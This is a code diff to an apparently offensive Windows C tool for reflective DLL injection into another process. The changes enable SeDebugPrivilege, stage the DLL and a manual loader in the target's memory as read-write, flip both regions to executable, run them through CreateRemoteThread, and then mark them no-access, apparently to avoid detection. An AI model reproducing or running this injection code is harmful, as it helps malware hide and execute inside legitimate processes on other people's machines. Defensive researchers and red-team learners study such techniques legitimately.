@@ -146,6 +146,9 @@ int main(int argc, char* argv[])
 	HANDLE hDll		= NULL;
 	HANDLE hProcess = NULL;
 	HANDLE hThread	= NULL;
+	HANDLE hToken	= NULL;
+	LUID luid = { 0 };
+
 
 	fprintf(stderr, "**** Hello in Reflective Dll Injection  ! **** \n");
 
@@ -178,6 +181,30 @@ int main(int argc, char* argv[])
 
 	}
 
+	// Get Token SE_DEBUG_PRIVILEGE
+	//Requires administrator rights ! 
+
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
+		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+			TOKEN_PRIVILEGES token = { 0 };
+			token.PrivilegeCount = 1;
+			token.Privileges[0].Luid = luid;
+			token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+			AdjustTokenPrivileges(hToken, FALSE, &token, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+		}
+		else {
+			EXIT_WITH_ERROR("Error LookupPrivilege ! ");
+			CloseHandle(hToken);
+		}
+	}
+	else {
+		fprintf(stderr,"[-] Didn't get SE_DEBUG_PRIVILEGE token ! ");
+	}
+
+	CloseHandle(hToken);
+
+
+
 	/* STEP 0 : Search pid of target process */
 
 	pid = processID(argv[1]);
@@ -186,18 +213,20 @@ int main(int argc, char* argv[])
 
 	/* STEP 1 : Open and read the DLL to a buffer */
 
+	fprintf(stderr, "*** Step 1 : Open and read the Dll to a buffer *** \n");
+
 	hDll = CreateFileA((LPCSTR)dll, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
 		OPEN_EXISTING, 0, NULL); 
 
 	if (!hDll)
-		EXIT_WITH_ERROR(" Can't handle dll !");
+		EXIT_WITH_ERROR("/!/ Can't handle dll !");
 
 
 	dllSize = GetFileSize(hDll, NULL);
 	dllBuffer = VirtualAlloc(NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	if (!ReadFile(hDll, dllBuffer, dllSize, NULL, NULL))
-		EXIT_WITH_ERROR("Can't read DLL");
+		EXIT_WITH_ERROR("/!/ Can't read DLL");
 
 	// Dll's Headers
 	pDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
@@ -205,34 +234,48 @@ int main(int argc, char* argv[])
 
 	/* STEP 2 : Open process and map sections into target process */
 
+	fprintf(stderr, "*** Step 2 : Open process and map section into target *** \n");
+
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
 	if (!hProcess)
-		EXIT_WITH_ERROR("can't open process Run As Admin");
+		EXIT_WITH_ERROR("/!/ Can't open process : try Run As Admin");
 
 	fprintf(stderr, "*** Open process : %p *** \n", hProcess);
+	fprintf(stderr, "*** Allocation of execImage *** \n");
 
 	// Allocating memory for the DLL
-	execImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	execImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	fprintf(stderr, "*** Address of execImage: %p *** \n", execImage);
+
+	DWORD oldPerms1, oldPerms2; 
 
 	/* STEP 3 : Inject sections and header of the DLL && inject loader payload */
+
+	fprintf(stderr, "*** Step 3 : Write payload in execImage *** \n");
 
 	// Copy the headers to target process
 	WriteProcessMemory(hProcess, execImage, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
 	// Target Dll's Section Header
 	pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
+
 	// Copying sections of the dll to the target process
 	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
 	{
 		WriteProcessMemory(hProcess, (PVOID)((LPBYTE)execImage + pSectHeader[i].VirtualAddress), (PVOID)((LPBYTE)dllBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
 	}
 
+	fprintf(stderr, "*** Allocation of loaderMem *** \n");
+
 	// Allocating memory for the manual loader code.
-	loaderMem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	loaderMem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	if (!loaderMem)
 		EXIT_WITH_ERROR(" Couldn't allocate for the loader code !");
+
+	fprintf(stderr, "*** Address of manual Loader : %p \n", loaderMem);
 
 	LParams.imageBase = execImage;
 	LParams.ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)execImage + pDosHeader->e_lfanew);
@@ -247,28 +290,46 @@ int main(int argc, char* argv[])
 
 	// Write the loader information to target process
 	WriteProcessMemory(hProcess, loaderMem, &LParams, sizeof(loaderData), NULL);
+
 	// Write the loader code to target process
 	WriteProcessMemory(hProcess, (PVOID)((loaderData*)loaderMem + 1), manualLoader, (DWORD64)stub - (DWORD64)manualLoader, NULL);
 	
+
 	/* STEP 6 : Create a remote thread to execute the manual loader */
+	fprintf(stderr, "*** Step 4 : Creation of a remote thread *** \n");
+	
+	fprintf(stderr, "*** Change permission of exeImage and loadermem : RW --> RWX *** \n");
+
+	if (!VirtualProtectEx(hProcess, (LPVOID)loaderMem, 4096, PAGE_EXECUTE_READWRITE, &oldPerms1))
+		fprintf(stderr, "/!/ Error in VirtualProtect #1 \n");
+
+	if (!VirtualProtectEx(hProcess, (LPVOID)execImage, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldPerms2))
+		fprintf(stderr, "/!/ Error in VirtualProtect #2 \n");
 
 	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderData*)loaderMem + 1), loaderMem, 0, NULL);
-	
-	if (!hThread)
-		EXIT_WITH_ERROR(" Can't create remote thread !");
 
-	fprintf(stderr, "*** Address of manual Loader : %p \n", loaderMem);
-	fprintf(stderr, "*** Address of Image: %p \n", execImage);
+	if (!hThread)
+		EXIT_WITH_ERROR("/!/ Can't create remote thread !")
+
+	if(WaitForSingleObject(hThread, 500) == 0x00000102L)
+		EXIT_WITH_ERROR("The thread did'nt run in time !");
+
+	if (!VirtualProtectEx(hProcess, (LPVOID)loaderMem, 4096, PAGE_NOACCESS, &oldPerms1))
+		fprintf(stderr, "Error in VirtualProtect #3 \n");
+
+	if (!VirtualProtectEx(hProcess, (LPVOID)execImage, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_NOACCESS, &oldPerms2))
+		fprintf(stderr, "Error in VirtualProtect #4 \n");
+	
 
 	fprintf(stderr, "*** Success ! Goodbye ! *** \n ");
 
 	/*STEP 8 : Clean up ! */
-	system("pause");
 
 	CloseHandle(hThread);
 	VirtualFree(dllBuffer, 0, MEM_RELEASE);
+	//VirtualFreeEx(hProcess, loaderMem, 0, MEM_RELEASE);
 	CloseHandle(hProcess);
 	CloseHandle(hDll);
-	VirtualFreeEx(hProcess, loaderMem, 0, MEM_RELEASE);
+
 	return 0;
 }
